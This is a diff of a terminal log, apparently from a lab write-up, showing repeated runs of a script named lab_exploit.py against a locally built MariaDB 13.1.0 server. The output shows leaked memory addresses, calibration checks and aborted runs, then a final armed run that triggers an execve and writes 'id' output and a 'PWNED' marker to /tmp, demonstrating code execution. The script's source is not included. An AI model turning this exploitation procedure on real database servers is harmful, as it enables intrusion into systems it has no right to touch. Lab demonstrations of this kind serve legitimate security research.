@@ -110,8 +110,60 @@ $ ~/mariadb-13.1.0-git/inst/bin/mariadbd \
   --pid-file="$HOME/off131/off.pid"
 
 # 13.1.0 lab exploit - The payload executes the /tmp/heal_t16.sh script.
+$ cat /tmp/frm_pwned_t16
+[bat error]: '/tmp/frm_pwned_t16': No such file or directory (os error 2)
+$ python3 lab_exploit.py
+[*] connected (single arena). server ver: 13.1.0-MariaDB
+[*] MB=0x60b8287d5000 LB=0x7eff60c00000
+[*] leaked C(comment_pos)=0x7eff38022c50
+[*] CALIB: re-leaked C2=0x7eff38022c50  stable=True
+[=] CALIB PASS. dry-run only. re-run with --fire to arm fieldnr=47 and trigger R5.
+$ python3 lab_exploit.py
+[*] connected (single arena). server ver: 13.1.0-MariaDB
+[*] MB=0x60b8287d5000 LB=0x7eff60c00000
+[*] leaked C(comment_pos)=0x7eff3802d7d0
+[*] CALIB: re-leaked C2=0x7eff3802d7d0  stable=True
+[=] CALIB PASS. dry-run only. re-run with --fire to arm fieldnr=47 and trigger R5.
+$ python3 lab_exploit.py
+[*] connected (single arena). server ver: 13.1.0-MariaDB
+[*] MB=0x60b8287d5000 LB=0x7eff60c00000
+[*] leaked C(comment_pos)=0x7eff38038d10
+[*] CALIB: re-leaked C2=0x7eff38038d10  stable=True
+[=] CALIB PASS. dry-run only. re-run with --fire to arm fieldnr=47 and trigger R5.
+$ python3 lab_exploit.py
+[*] connected (single arena). server ver: 13.1.0-MariaDB
+[*] MB=0x60b8287d5000 LB=0x7eff60c00000
+[*] leaked C(comment_pos)=0x7eff38044fd0
+[*] CALIB: re-leaked C2=0x7eff380474d0  stable=False
+[!] chunk NOT stable across deliver (C moved) -> ABORT before firing
 $ python3 lab_exploit.py --fire
-$ cat /tmp/frm_selfheal 
+[*] connected (single arena). server ver: 13.1.0-MariaDB
+[*] MB=0x60b8287d5000 LB=0x7eff60c00000
+[*] leaked C(comment_pos)=0x7eff3804b8b0
+[*] CALIB: re-leaked C2=0x7eff3804ddb0  stable=False
+[!] chunk NOT stable across deliver (C moved) -> ABORT before firing
+$ python3 lab_exploit.py --fire
+[*] connected (single arena). server ver: 13.1.0-MariaDB
+[*] MB=0x60b8287d5000 LB=0x7eff60c00000
+[*] leaked C(comment_pos)=0x7eff380517e0
+[*] CALIB: re-leaked C2=0x7eff38051cd0  stable=False
+[!] chunk NOT stable across deliver (C moved) -> ABORT before firing
+$ python3 lab_exploit.py --fire
+[*] connected (single arena). server ver: 13.1.0-MariaDB
+[*] MB=0x60b8287d5000 LB=0x7eff60c00000
+[*] leaked C(comment_pos)=0x7eff38051cd0
+[*] CALIB: re-leaked C2=0x7eff38051cd0  stable=True
+[*] arming fieldnr=47, delivering weapon, triggering R5 (execve). cmd='id > /tmp/frm_pwned_t16 2>&1; echo PWNED_$(id -u) >> /tmp/frm_pwned_t16'
+[*] trigger raised (expected on execve): OperationalError(2013, 'Lost connection to MySQL server during query')
+[*] fired. check /tmp/frm_pwned_t16 for proof.
+$ cat /tmp/frm_pwned_t16
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: /tmp/frm_pwned_t16
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ uid=1000(pinebudweiser) gid=1000(pinebudweiser) groups=1000(pinebudweiser),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(p
+       │ lugdev),100(users),107(netdev)
+   2   │ PWNED_1000
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 $ rm -rf /tmp/frm_selfheal 
 ```
 
